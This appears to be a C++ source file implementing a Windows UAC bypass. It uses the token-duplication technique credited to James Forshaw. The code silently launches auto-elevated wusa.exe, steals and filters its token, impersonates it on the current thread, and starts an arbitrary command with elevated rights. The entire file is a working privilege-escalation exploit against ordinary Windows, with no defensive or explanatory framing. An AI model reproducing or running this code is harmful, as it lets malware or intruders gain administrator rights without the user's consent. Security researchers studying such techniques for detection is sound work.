#pragma comment(lib, "ntdll.lib")
#include "uac.hpp"
#include <winternl.h>
#include <Aclapi.h>
#include <stdexcept>
#include <iostream>
#include <stdint.h>

extern "C" NTSTATUS NTAPI NtOpenProcessToken(
	_In_	HANDLE ProcessHandle,
	_In_	ACCESS_MASK DesiredAccess,
	_Out_	PHANDLE TokenHandle
);

extern "C" NTSTATUS NTAPI NtDuplicateToken(
	_In_ HANDLE ExistingTokenHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_ BOOLEAN EffectiveOnly,
	_In_ TOKEN_TYPE TokenType,
	_Out_ PHANDLE NewTokenHandle
);

extern "C" NTSTATUS NTAPI RtlAllocateAndInitializeSid(
	IN PSID_IDENTIFIER_AUTHORITY IdentifierAuthority,
	IN UCHAR SubAuthorityCount,
	IN ULONG SubAuthority0,
	IN ULONG SubAuthority1,
	IN ULONG SubAuthority2,
	IN ULONG SubAuthority3,
	IN ULONG SubAuthority4,
	IN ULONG SubAuthority5,
	IN ULONG SubAuthority6,
	IN ULONG SubAuthority7,
	OUT PSID *Sid
);

extern "C" ULONG NTAPI RtlLengthSid(
	PSID Sid
);

extern "C" NTSTATUS NTAPI NtSetInformationToken(
	_In_ HANDLE TokenHandle,
	_In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
	_In_ PVOID TokenInformation,
	_In_ ULONG TokenInformationLength
);

extern "C" NTSTATUS NTAPI NtSetInformationThread(
	_In_       HANDLE ThreadHandle,
	_In_       THREADINFOCLASS ThreadInformationClass,
	_In_       PVOID ThreadInformation,
	_In_       ULONG ThreadInformationLength
);

#define LUA_TOKEN               0x4

extern "C" NTSTATUS NTAPI NtFilterToken(
	_In_ HANDLE ExistingTokenHandle,
	_In_ ULONG Flags,
	_In_opt_ PTOKEN_GROUPS SidsToDisable,
	_In_opt_ PTOKEN_PRIVILEGES PrivilegesToDelete,
	_In_opt_ PTOKEN_GROUPS RestrictedSids,
	_Out_ PHANDLE NewTokenHandle
);

#define NtCurrentThread() ( (HANDLE)(LONG_PTR) -2 )

#define ThreadImpersonationToken static_cast<THREADINFOCLASS>(5)

bool can_be_elevated() {
	bool res = false;

	HANDLE token = nullptr;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
		throw std::runtime_error("Unable to open current process's token");
	}

	TOKEN_ELEVATION_TYPE elevation_type;
	DWORD elevation_length = 0;
	if (!GetTokenInformation(token, TokenElevationType, &elevation_type, sizeof(elevation_type), &elevation_length)) {
		throw std::runtime_error("Unable to get process token information");
	}

	CloseHandle(token);

	return elevation_type == TokenElevationTypeLimited;
}

void elevate(LPWSTR cmd) {
	// Uses token manipulation exploit described by James Forshaw (tyranid) 
	// https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html

	SHELLEXECUTEINFO sh_info{ 0 };
	HANDLE proc_token = nullptr;
	SECURITY_QUALITY_OF_SERVICE sqos{ 0 };
	OBJECT_ATTRIBUTES obj_attribs{ 0 };
	HANDLE dup_token = nullptr;
	SID_IDENTIFIER_AUTHORITY auth = SECURITY_MANDATORY_LABEL_AUTHORITY;
	PSID integrity_sid = nullptr;
	TOKEN_MANDATORY_LABEL tml{ 0 };
	ULONG tml_length = 0;
	HANDLE lua_token = nullptr;
	HANDLE imp_token = nullptr;

	STARTUPINFOW si{ 0 };
	PROCESS_INFORMATION pi{ 0 };

	// Run an auto-elevated process
	sh_info.cbSize = sizeof(sh_info);
	sh_info.fMask = SEE_MASK_NOCLOSEPROCESS;
	sh_info.lpFile = "wusa.exe";
	sh_info.nShow = SW_HIDE;

	if (!ShellExecuteEx(&sh_info)) {
		std::cerr << "ShellExecute" << std::endl;
		goto cleanup;
	}

	// Get elevated process's token
	if (!NT_SUCCESS(NtOpenProcessToken(sh_info.hProcess, MAXIMUM_ALLOWED, &proc_token))) {
		std::cerr << "NtOpenProcessToken" << std::endl;
		goto cleanup;
	}

	sqos.Length = sizeof(sqos);
	sqos.ImpersonationLevel = SecurityImpersonation;
	sqos.ContextTrackingMode = 0;
	sqos.EffectiveOnly = false;

	obj_attribs.Length = sizeof(obj_attribs);
	obj_attribs.SecurityQualityOfService = &sqos;

	// Duplicate the token so it can be modified
	if (!NT_SUCCESS(NtDuplicateToken(proc_token, TOKEN_ALL_ACCESS, &obj_attribs, FALSE, TokenPrimary, &dup_token))) {
		goto cleanup;
	}

	// Get the SID for a Medium level Mandatory Label Policy
	if (!NT_SUCCESS(RtlAllocateAndInitializeSid(&auth, 1, SECURITY_MANDATORY_MEDIUM_RID, 0, 0, 0, 0, 0, 0, 0, &integrity_sid))) {
		goto cleanup;
	}

	tml.Label.Attributes = SE_GROUP_INTEGRITY;
	tml.Label.Sid = integrity_sid;

	// Lower the Mandatory Label Policy from High to Medium so we can write to it
	tml_length = sizeof(tml) + RtlLengthSid(integrity_sid);
	if (!NT_SUCCESS(NtSetInformationToken(dup_token, TokenIntegrityLevel, &tml, tml_length))) {
		goto cleanup;
	}

	// Create a restricted version of the token
	if (!NT_SUCCESS(NtFilterToken(dup_token, LUA_TOKEN, NULL, NULL, NULL, &lua_token))) {
		goto cleanup;
	}

	// Add impersonation access to the LUA token
	if (!NT_SUCCESS(NtDuplicateToken(lua_token, TOKEN_IMPERSONATE | TOKEN_QUERY, &obj_attribs, FALSE, TokenImpersonation, &imp_token))) {
		goto cleanup;
	}

	// Set the current thread's impersonation token to the leaked one
	if (!NT_SUCCESS(NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &imp_token, sizeof(imp_token)))) {
		goto cleanup;
	}

	si.cb = sizeof(si);
	GetStartupInfoW(&si);

	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;

	if (!CreateProcessWithLogonW(L"user", L"domain", L"pass", LOGON_NETCREDENTIALS_ONLY, NULL, cmd, 0, NULL, NULL, &si, &pi)) {
		goto cleanup;
	}

cleanup:
	TerminateProcess(sh_info.hProcess, 1);
}
